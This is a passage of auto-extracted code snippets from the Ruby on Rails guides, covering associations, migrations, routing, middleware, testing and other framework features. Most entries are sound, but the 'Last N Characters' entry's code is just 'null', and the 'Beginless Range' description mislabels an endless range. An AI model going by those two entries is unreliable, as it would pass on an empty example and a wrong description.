https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n<%= link_to @profile do %>\n  <strong><%= @profile.name %></strong> -- <span>Check it out!</span>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Network Address Types in PostgreSQL\nDESCRIPTION: Shows implementation of PostgreSQL network address types (inet, cidr, macaddr) in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20140508144913_create_devices.rb\ncreate_table(:devices, force: true) do |t|\n  t.inet \"ip\"\n  t.cidr \"network\"\n  t.macaddr \"address\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/device.rb\nclass Device < ApplicationRecord\nend\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> macbook = Device.create(ip: \"192.168.1.12\", network: \"192.168.2.0/24\", address: \"32:01:16:6d:05:ef\")\n\nirb> macbook.ip\n=> #<IPAddr: IPv4:192.168.1.12/255.255.255.255>\n\nirb> macbook.network\n=> #<IPAddr: IPv4:192.168.2.0/255.255.255.0>\n\nirb> macbook.address\n=> \"32:01:16:6d:05:ef\"\n```\n\n----------------------------------------\n\nTITLE: Spanish Product Price Format Configuration\nDESCRIPTION: YAML configuration for the Spanish product price format that places the currency symbol after the price using variable interpolation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_27\n\nLANGUAGE: yaml\nCODE:\n```\n# config/locales/es.yml\nes:\n  product_price: \"%{price} €\"\n```\n\n----------------------------------------\n\nTITLE: Implementing Entryable Module for Delegated Types in Rails\nDESCRIPTION: Defines an Entryable module that implements the delegated types relationship by declaring a has_one association with the as: :entryable parameter. This module will be included in delegate subclasses to complete the polymorphic relationship.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_87\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Entryable\n  extend ActiveSupport::Concern\n\n  included do\n    has_one :entry, as: :entryable, touch: true\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a Route with Dynamic Segments - Ruby\nDESCRIPTION: This snippet defines a route with two dynamic segments: `:id` and `:user_id`. These segments will be available in the `params` hash when the route is matched.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nget \"photos/:id/:user_id\", to: \"photos#show\"\n```\n\n----------------------------------------\n\nTITLE: Advancing DateTime with Options in Ruby\nDESCRIPTION: This snippet demonstrates the `advance` method, which allows advancing a DateTime object by specified amounts of years, months, weeks, days, hours, minutes, and seconds. The method takes a hash as an argument, with keys corresponding to the desired units of time to advance. The order of advancing date components vs time components matters due to edge cases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_162\n\nLANGUAGE: ruby\nCODE:\n```\nd = DateTime.current\n# => Thu, 05 Aug 2010 11:33:31 +0000\nd.advance(years: 1, months: 1, days: 1, hours: 1, minutes: 1, seconds: 1)\n# => Tue, 06 Sep 2011 12:34:32 +0000\n```\n\n----------------------------------------\n\nTITLE: Using after_bundle in Rails application templates\nDESCRIPTION: Rails template example showing how to use the after_bundle block to execute code after Bundler has generated the binstubs, which is useful for initializing Git repositories.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_68\n\nLANGUAGE: ruby\nCODE:\n```\n# template.rb\ngenerate(:scaffold, \"person name:string\")\nroute \"root to: 'people#index'\"\nrake(\"db:migrate\")\n\nafter_bundle do\n  git :init\n  git add: \".\"\n  git commit: %Q{ -m 'Initial commit' }\nend\n```\n\n----------------------------------------\n\nTITLE: Use Custom Cache Store\nDESCRIPTION: This snippet shows how to configure Rails to use a custom cache store implementation by instantiating and assigning it to the `config.cache_store` setting.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = MyCacheStore.new\n```\n\n----------------------------------------\n\nTITLE: Extracting Composite Key Parameters in Controller\nDESCRIPTION: This snippet demonstrates how to extract composite key parameters from a URL in a Rails controller using the `extract_value` method. This allows the controller to retrieve the individual values from the composite key parameter and use them to find the appropriate record. The example shows extracting the `:id` parameter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nclass BooksController < ApplicationController\n  def show\n    # Extract the composite ID value from URL parameters.\n    id = params.extract_value(:id)\n    # Find the book using the composite ID.\n    @book = Book.find(id)\n    # use the default rendering behaviour to render the show view.\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Join Table Migration (Shell)\nDESCRIPTION: This command generates a migration to create a join table for a many-to-many relationship between `users` and `products`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_18\n\nLANGUAGE: Shell\nCODE:\n```\n$ bin/rails generate migration CreateJoinTableUserProduct user product\n```\n\n----------------------------------------\n\nTITLE: Defining has_many Association in Ruby on Rails\nDESCRIPTION: Demonstrates how to declare a has_many association in a Rails model, establishing a one-to-many relationship between authors and books.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books\nend\n```\n\n----------------------------------------\n\nTITLE: Instantiating a Model in a Controller\nDESCRIPTION: Illustrates how to create an instance of a model within a controller action and assign it to an instance variable, making it available to the view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\ndef new\n  @client = Client.new\nend\n```\n\n----------------------------------------\n\nTITLE: Using Bit String Types in PostgreSQL\nDESCRIPTION: Demonstrates how to work with PostgreSQL bit string data types in Rails models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_users.rb\ncreate_table :users, force: true do |t|\n  t.column :settings, \"bit(8)\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/user.rb\nclass User < ApplicationRecord\nend\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> User.create settings: \"01010011\"\nirb> user = User.first\nirb> user.settings\n=> \"01010011\"\nirb> user.settings = \"0xAF\"\nirb> user.settings\n=> \"10101111\"\nirb> user.save!\n```\n\n----------------------------------------\n\nTITLE: Enabling CSRF Origin Check in Rails 5\nDESCRIPTION: Configuration to enable checking the HTTP Origin header against the site's origin as an additional CSRF defense mechanism in Rails 5.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_controller.forgery_protection_origin_check = true\n```\n\n----------------------------------------\n\nTITLE: Formatting Percentages with number_to_percentage in Ruby\nDESCRIPTION: Demonstrates the use of number_to_percentage helper to format a number as a percentage string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nnumber_to_percentage(100, precision: 0) # => 100%\n```\n\n----------------------------------------\n\nTITLE: Creating Records in Rails Console for API Testing\nDESCRIPTION: Ruby commands to create sample 'Group' records in the Rails console for testing the API endpoints.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nirb> Group.create(name: \"Rails Founders\")\nirb> Group.create(name: \"Rails Contributors\")\n```\n\n----------------------------------------\n\nTITLE: Finding the maximum value with maximum in Rails\nDESCRIPTION: Demonstrates how to use the `maximum` method to find the maximum value of a specific column in a table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_207\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.maximum(\"subtotal\")\n```\n\n----------------------------------------\n\nTITLE: Date calculations with quarter in Ruby\nDESCRIPTION: The method `quarter` returns the quarter of the receiver's calendar year.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_145\n\nLANGUAGE: ruby\nCODE:\n```\nd = Date.new(2010, 5, 9) # => Sun, 09 May 2010\nd.quarter                # => 2\n```\n\n----------------------------------------\n\nTITLE: Beginless Range Condition in Rails\nDESCRIPTION: This demonstrates using a beginless range to find all books created on or after a specific date.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(created_at: (Time.now.midnight - 1.day)..)\n```\n\n----------------------------------------\n\nTITLE: ActiveRecord Unique Query Generation\nDESCRIPTION: Shows different ways to generate unique queries using the uniq method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nClient.select('DISTINCT name')\n\nClient.select(:name).uniq\n\nClient.select(:name).uniq.uniq(false)\n```\n\n----------------------------------------\n\nTITLE: Inspecting Variables in Ruby\nDESCRIPTION: Demonstrates how to list instance and local variables in a Ruby context. These methods are useful for debugging and introspection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\ninstance_variables\n```\n\nLANGUAGE: ruby\nCODE:\n```\nlocal_variables\n```\n\n----------------------------------------\n\nTITLE: First or Create Pattern Implementation\nDESCRIPTION: Demonstrates the use of first_or_create method for finding or creating records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nUser.where(:first_name => \"Scarlett\").first_or_create!(:last_name => \"Johansson\")\n```\n\n----------------------------------------\n\nTITLE: Safe SQL Query with Positional Parameters\nDESCRIPTION: Secure way to write SQL queries using positional parameter sanitization in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nModel.where(\"zip_code = ? AND quantity >= ?\", entered_zip_code, entered_quantity).first\n```\n\n----------------------------------------\n\nTITLE: Secondary Database Abstract Class Configuration in Ruby\nDESCRIPTION: Configuration for the animals database abstract class with replica support.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nclass AnimalsRecord < ApplicationRecord\n  self.abstract_class = true\n\n  connects_to database: { writing: :animals, reading: :animals_replica }\nend\n```\n\n----------------------------------------\n\nTITLE: form_with with Multi-Level Namespaces\nDESCRIPTION: This snippet shows how to use form_with with multiple levels of namespacing in routes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nform_with model: [:admin, :management, @article]\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - plural (IRB)\nDESCRIPTION: Demonstrates the `plural` method of `model_name` from `ActiveModel::Naming`.  It returns the plural class name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_25\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.plural\n=> \"people\"\n```\n\n----------------------------------------\n\nTITLE: Sample Rails Console Prompt\nDESCRIPTION: This code block is not code, but a sample terminal prompt for the Rails console.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_19\n\nLANGUAGE: irb\nCODE:\n```\nLoading development environment (Rails 8.1.0)\nstore(dev)>\n```\n\n----------------------------------------\n\nTITLE: Simple Select Box in ERB\nDESCRIPTION: This ERB code uses `form.select` to generate a simple select box with a list of city options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_31\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.select :city, [\"Berlin\", \"Chicago\", \"Madrid\"] %>\n```\n\n----------------------------------------\n\nTITLE: Importing Active Storage from NPM Package\nDESCRIPTION: Demonstrates how to import and initialize Active Storage when using it as an npm package in a JavaScript module.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_64\n\nLANGUAGE: js\nCODE:\n```\nimport * as ActiveStorage from \"@rails/activestorage\"\nActiveStorage.start()\n```\n\n----------------------------------------\n\nTITLE: Running Tests in a Directory - Rails\nDESCRIPTION: This command demonstrates how to run all tests within a specific directory using the Rails test runner.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_21\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test test/controllers # run all tests from specific directory\n```\n\n----------------------------------------\n\nTITLE: Creating Email Previews in Rails\nDESCRIPTION: Example of implementing email preview functionality for testing and development.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailerPreview < ActionMailer::Preview\n  def welcome_email\n    UserMailer.with(user: User.first).welcome_email\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Action View Template Finalizers in Ruby on Rails\nDESCRIPTION: Adds a configuration option to disable or enable ActionView::Template finalizers for performance tuning.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_0_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: Ruby\nCODE:\n```\nconfig.action_view.finalize_compiled_template_methods\n```\n\n----------------------------------------\n\nTITLE: Using View Helpers in Action Mailer Templates\nDESCRIPTION: Example of using Action Mailer specific helper methods in email templates.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_36\n\nLANGUAGE: erb\nCODE:\n```\n<%= stylesheet_link_tag mailer.name.underscore %>\n<h1><%= message.subject %></h1>\n```\n\n----------------------------------------\n\nTITLE: Custom Event Subscription Example\nDESCRIPTION: Demonstrates how to subscribe to and handle custom instrumentation events.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Notifications.subscribe \"my.custom.event\" do |name, started, finished, unique_id, data|\n  puts data.inspect # {:this=>:data}\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Audio Tag with audio_tag Helper in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `audio_tag` helper in Rails to generate an HTML5 `<audio>` tag. It loads the audio from the `public/audios` directory and sets the `src` attribute of the `<audio>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_63\n\nLANGUAGE: erb\nCODE:\n```\n<%= audio_tag \"music.mp3\" %>\n```\n\n----------------------------------------\n\nTITLE: Viewing Generator Help\nDESCRIPTION: Command to view detailed help for the scaffold generator\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold --help\n```\n\n----------------------------------------\n\nTITLE: find_by! using where and take!\nDESCRIPTION: This code demonstrates the equivalent Ruby code for `find_by!` using `where` and `take!`. It provides an alternative implementation for finding a record by a specific attribute and raising an exception if not found.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(first_name: \"does not exist\").take!\n```\n\n----------------------------------------\n\nTITLE: Active Storage Error Handling\nDESCRIPTION: Introduction of new error handling mechanism for missing files in Active Storage\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_0_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nActiveStorage::FileNotFoundError\nActiveStorage::Error\n```\n\n----------------------------------------\n\nTITLE: Rendering with Inline Builder\nDESCRIPTION: Demonstrates rendering XML content directly within the controller using inline Builder. Requires specifying the `:type` option as `:builder`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nrender inline: \"xml.p {'Horrid coding practice!'}\", type: :builder\n```\n\n----------------------------------------\n\nTITLE: Adding custom middleware to Rails stack\nDESCRIPTION: Demonstrates adding a custom middleware (`Magical::Unicorns`) to the Rails middleware stack using `config.middleware.use`. This adds the middleware to the end of the stack.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.use Magical::Unicorns\n```\n\n----------------------------------------\n\nTITLE: Swapping middleware in Rails\nDESCRIPTION: Demonstrates swapping one middleware (`ActionController::Failsafe`) with another (`Lifo::Failsafe`) in the Rails middleware stack using `config.middleware.swap`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.swap ActionController::Failsafe, Lifo::Failsafe\n```\n\n----------------------------------------\n\nTITLE: Database Migration Command - Bash\nDESCRIPTION: This bash command runs the database migrations to create the User and Session tables in the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_67\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Example of Relation Mutator Usage\nDESCRIPTION: Demonstration of correct way to use mutator methods with Relations\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_82\n\nLANGUAGE: ruby\nCODE:\n```\n# Instead of this\nAuthor.where(name: \"Hank Moody\").compact!\n\n# Now you have to do this\nauthors = Author.where(name: \"Hank Moody\").to_a\nauthors.compact!\n```\n\n----------------------------------------\n\nTITLE: Copying Engine Migrations to Host Application\nDESCRIPTION: Command to copy the engine's migrations to the host application so they can be run on the application's database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_42\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails blorgh:install:migrations\n```\n\n----------------------------------------\n\nTITLE: Creating an Article\nDESCRIPTION: Demonstrates how to create a new article in Ruby. Used as a prerequisite for the partial layout example.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nArticle.create(body: \"Partial Layouts are cool!\")\n```\n\n----------------------------------------\n\nTITLE: Running Rails Runner Commands\nDESCRIPTION: Examples of using the Rails runner command to execute Ruby code in a Rails application context non-interactively.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails runner \"Model.long_running_method\"\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails runner -e staging \"Model.long_running_method\"\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails runner lib/code_to_be_run.rb\n```\n\n----------------------------------------\n\nTITLE: ActiveRecord Lock Implementation Patterns\nDESCRIPTION: Shows different ways to implement record locking in transactions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ActiveRecord::Base\n  def cancel!\n    with_lock do\n      # ... cancelling logic\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: ActiveRecord Table Name Configuration\nDESCRIPTION: Demonstrates different ways to set table names in ActiveRecord models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nclass Post < ActiveRecord::Base\n  def self.table_name\n    \"special_\" + super\n  end\nend\n\nPost.table_name # => \"special_posts\"\n```\n\n----------------------------------------\n\nTITLE: HTML Video Tag Output\nDESCRIPTION: This code snippet shows the HTML output generated by the `video_tag` helper with a video source.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_60\n\nLANGUAGE: html\nCODE:\n```\n<video src=\"/videos/movie.ogg\" />\n```\n\n----------------------------------------\n\nTITLE: Installing Rack CORS Gem in Rails\nDESCRIPTION: Adding the rack-cors gem to the Gemfile to enable Cross-Origin Resource Sharing in a Rails application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"rack-cors\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving Manager in Self-Join Relationship\nDESCRIPTION: Shows how to access the manager of an employee using the belongs_to association in a self-join relationship.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\nmanager = employee.manager\n```\n\n----------------------------------------\n\nTITLE: Cloning the Rails repository for contribution\nDESCRIPTION: Command to clone the Rails repository to your local machine, necessary for contributing code to the project.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ git clone https://github.com/rails/rails.git\n```\n\n----------------------------------------\n\nTITLE: Rails Generator Skip Options\nDESCRIPTION: Command line options for skipping certain features during Rails application generation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_0_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n--skip-listen\n--skip-action-mailer\n```\n\n----------------------------------------\n\nTITLE: Moving middleware before another in Rails\nDESCRIPTION: Demonstrates moving a middleware (`Magical::Unicorns`) before another middleware (`ActionDispatch::Flash`) in the Rails middleware stack using `config.middleware.move_before`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.move_before ActionDispatch::Flash, Magical::Unicorns\n```\n\n----------------------------------------\n\nTITLE: Rails Parameter Parser Configuration\nDESCRIPTION: Updated method for configuring parameter parsers in Rails applications after deprecation of ActionDispatch::ParamsParser.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_0_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nActionDispatch::Request.parameter_parsers=\n```\n\n----------------------------------------\n\nTITLE: Last N Characters\nDESCRIPTION: This snippet demonstrates extracting the last N characters from a string using the `last` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nnull\n```\n\n----------------------------------------\n\nTITLE: Configuring Rails Engines Loading Order\nDESCRIPTION: Configuration example for changing the loading order of Rails engines using config.railties_order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.railties_order = [Blog::Engine, :main_app, :all]\n```\n\n----------------------------------------\n\nTITLE: Rails 3.2 Scaffold Generator with Modifiers\nDESCRIPTION: Example of using the Rails scaffold generator with index and unique modifiers for attributes, along with custom decimal options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails g scaffold Post title:string:index author:uniq price:decimal{7,2}\n```\n\n----------------------------------------\n\nTITLE: Defining Active Storage Blob Fixtures in YAML\nDESCRIPTION: Creates a blob fixture using ActiveStorage::FixtureSet.blob helper to specify filename and service_name for the test fixture.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_79\n\nLANGUAGE: yaml\nCODE:\n```\ndavid_avatar_blob: <%= ActiveStorage::FixtureSet.blob filename: \"david.png\", service_name: \"test_fixtures\" %>\n```\n\n----------------------------------------\n\nTITLE: Integration Test Path Format Example in Ruby\nDESCRIPTION: Example showing the correct format for path parameters in Rails integration tests, emphasizing the requirement for a leading slash in the path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"list all posts\" do\n  get \"/posts\"\n  assert_response :success\nend\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of finding a record with composite primary key\nDESCRIPTION: This snippet illustrates the SQL query equivalent to finding a record using a composite primary key. It uses the `WHERE` clause to specify conditions for both `store_id` and `sku`, which are part of the composite key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM products WHERE store_id = 3 AND sku = \"XYZ12345\"\n```\n\n----------------------------------------\n\nTITLE: Defining Engine Model Class in Ruby\nDESCRIPTION: Example of a basic engine model class definition that can be overridden by the main application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\n# Blorgh/app/models/blorgh/article.rb\nmodule Blorgh\n  class Article < ApplicationRecord\n    # ...\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Applying a Rails Template using rails new\nDESCRIPTION: Demonstrates how to apply a Rails template when creating a new Rails application using the `rails new` command with the `-m` option. The template can be a local file path or a URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new blog -m ~/template.rb\n$ rails new blog -m http://example.com/template.rb\n```\n\n----------------------------------------\n\nTITLE: Correct Import From @rails/ujs in Rails 7.1\nDESCRIPTION: Example showing the correct way to import modules from @rails/ujs in Rails 7.1. Users should import the Rails object directly and then access specific modules from it.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nimport Rails from \"@rails/ujs\"\n// Alias the method\nconst fileInputSelector = Rails.fileInputSelector\n// Alternatively, reference it from the Rails object where it is used\nRails.fileInputSelector(...)\n```\n\n----------------------------------------\n\nTITLE: Querying Object Duplicability with `duplicable?`\nDESCRIPTION: This snippet demonstrates how to use `duplicable?` to check if an object can be duplicated using `dup` or `clone`. It helps to avoid `TypeError` exceptions when attempting to duplicate non-duplicable objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n\"foo\".duplicable?           # => true\n\"\".duplicable?              # => true\nRational(1).duplicable?     # => true\nComplex(1).duplicable?      # => true\n1.method(:+).duplicable?    # => false\n```\n\n----------------------------------------\n\nTITLE: SQL query generated by unscoped.all in Rails\nDESCRIPTION: This SQL query is the result of the `Book.unscoped.all` command, which removes all scoping and retrieves all records from the `books` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_171\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books\n```\n\n----------------------------------------\n\nTITLE: Using a Custom Mobile System Test Case (Ruby)\nDESCRIPTION: This Ruby code demonstrates how to use the custom `MobileSystemTestCase` to write system tests that target mobile devices. It creates a `PostsTest` class that inherits from `MobileSystemTestCase` and then writes a test that visits the posts URL and asserts that an `h1` element with the text \"Posts\" is present.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"mobile_system_test_case\"\n\nclass PostsTest < MobileSystemTestCase\n  test \"visiting the index\" do\n    visit posts_url\n    assert_selector \"h1\", text: \"Posts\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Customizing Inflections with ActiveSupport\nDESCRIPTION: Configuration for customizing string inflections globally using ActiveSupport::Inflector.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Inflector.inflections(:en) do |inflect|\n  inflect.acronym \"HTML\"\n  inflect.acronym \"SSL\"\nend\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Single after_commit Trigger for Same Record in Rails\nDESCRIPTION: This code demonstrates that `after_commit` callbacks are only triggered for the first object representing a specific database record that changes within a transaction.  Even if the same record is represented by multiple objects, only the first one to be modified will trigger the callback. This nuance is crucial for understanding callback behavior in complex transactions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  after_commit :log_user_saved_to_db, on: :update\n\n  private\n    def log_user_saved_to_db\n      Rails.logger.info(\"User was saved to database\")\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Creating STI Records\nDESCRIPTION: Shows the SQL query that Rails generates when creating a record using Single Table Inheritance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_75\n\nLANGUAGE: sql\nCODE:\n```\nINSERT INTO \"vehicles\" (\"type\", \"color\", \"price\") VALUES ('Car', 'Red', 10000)\n```\n\n----------------------------------------\n\nTITLE: Adding Bootsnap to Rails 5.2 Application\nDESCRIPTION: Code for adding the bootsnap gem to a Rails 5.2 application's Gemfile. Bootsnap reduces boot times through caching and is now included by default in new Rails 5.2 applications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_45\n\nLANGUAGE: ruby\nCODE:\n```\n# Reduces boot times through caching; required in config/boot.rb\ngem \"bootsnap\", require: false\n```\n\n----------------------------------------\n\nTITLE: Generated HTML for Link with Confirmation\nDESCRIPTION: This snippet displays the HTML output for a link with both a custom 